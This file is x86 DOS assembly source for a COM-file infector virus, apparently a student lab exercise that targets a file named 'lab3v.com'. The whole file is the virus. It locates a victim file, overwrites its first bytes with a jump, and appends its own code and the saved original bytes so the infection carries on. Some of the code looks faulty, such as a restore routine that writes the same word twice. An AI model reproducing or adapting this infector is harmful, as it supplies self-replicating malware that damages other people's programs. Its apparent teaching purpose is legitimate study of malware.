.model tiny
.code
org 100h
start:

    ; db 0e9h, 1, 0 ; word-pointer jump
    ; db 0ffh ; (⌐■_■)

hardcode:

    mov bp, 0

code:

    ; setting dta on file
    mov ah, 1ah
    lea dx, [bp + file]
    int 21h

    ; finding victim file
    lea dx, [bp + file_mask]
    mov ah, 4eh
    int 21h

    ; opening file (file descriptor -> ax)
    lea dx, [bp + file.fname]
    mov ax, 3D02h
    int 21h

    ; output infected filename
    mov al, '$'
    mov file.fname[12], al
    push dx
    lea dx, [bp + file.fname]
    mov ah, 09h
    int 21h
    pop dx
    mov file.fname[12], 0

    ; file error handling
    jnc file_err_skip
    lea dx, [bp + file_err_msg]
    mov ah, 09h
    int 21h
    mov ah, 4ch
    int 21h

file_err_skip:

    ; reverting first bytes
    mov bx, 100h
    mov ax,  leading_bytes[0]
    mov word ptr[bx], ax
    mov ax,  leading_bytes[2]
    mov word ptr[bx], ax

    ; moving carret to the end to get the payload offset
    mov cx, 0
    mov dx, 0
    mov bx, ax ; file descriptor (ax) -> bx
    mov ax, 4202h
    int 21h
    mov [bp + payload_offset], ax
    add ax, 100h
    mov [bp + victim_bp], ax

    ; ; preparing payload addressation
    ; mov al, [bp + payload_offset]
    ; mov ah, 0
    ; add ax, 107h
    ; sub ax, [bp + offset code]
    
    ; moving carret to the start
    mov cx, 0
    mov dx, 0
    mov ax, 4200h
    int 21h

    ; reading first 4 bytes:
    mov cx, 4
    lea dx, [bp + leading_bytes]
    mov ah, 3fh
    int 21h
    
    ; moving carret to the start
    mov cx, 0
    mov dx, 0
    mov ax, 4200h
    int 21h

    ; inserting load injection
    mov [bp + byte_buffer], 0e9h ; word-pointer jmp
    lea dx, [bp + byte_buffer]
    mov cx, 1
    mov ah, 40h
    int 21h
    
    mov ax, [bp + victim_bp] ; jmp offset
    add ax, 100h ; com header
    mov [bp + word_buffer], ax
    lea dx, [bp + word_buffer]
    mov cx, 2
    mov ah, 40h
    int 21h
    
    mov [bp + byte_buffer], 0ffh
    lea dx, [bp + byte_buffer]
    mov cx, 1
    mov ah, 40h
    int 21h
    
    ; moving carret to the end
    mov cx, 0
    mov dx, 0
    mov ax, 4202h
    int 21h

    ; writing payload hardcode
    mov [bp + byte_buffer], 0bdh
    lea dx, [bp + byte_buffer]
    mov cx, 1
    mov ah, 40h
    int 21h
    
    mov ax, [bp + victim_bp]
    mov [bp + word_buffer], ax
    mov dx, bp + word_buffer
    mov cx, 2
    mov ah, 40h
    int 21h

    ; writing payload code
    mov dx, bp + code
    add dx, bp
    mov cx, bp + offset harddata
    sub cx, offset code
    mov ah, 40h
    int 21h

    ; writing payload harddata
    mov dx, bp + leading_bytes
    mov cx, 4
    mov ah, 40h
    int 21h
    
    ; writing payload data
    mov dx, bp + offset data
    lea cx, afterall
    sub cx, offset data
    mov ah, 40h
    int 21h

    ; closing file
    mov ah, 3eh
    int 21h
    ret

    mov ah, 4ch
    int 21h

    ; redirect to victim program
    mov ax, 100h
    jmp ax

harddata:

    leading_bytes dd 0b4h, 4ch, 0cdh, 21h

data:
    
    ; 13-byte string for filename
    Str13 struc
    max db 13
    len db ?
    text db 13 dup(?)
    Str13 ends

    ; DTA buffer structure
    DTAFileInfo struc
    reserved db 21 dup(?)
    fattr db ?
    ftime dw ?
    fdate dw ?
    fsize dd ?
    fname db 13 dup(?)
    ends
    
    filename Str13 <>
    file DTAFileInfo <>

    data_local_addr dw ?
    dword_buffer dd ?
    word_buffer dw ?
    byte_buffer db ?
    payload_offset dw ?
    victim_bp dw ?
    file_mask db 'lab3v.com', 0
    file_err_msg db 'No any file to infect', 13, 10, '$'

afterall:

end start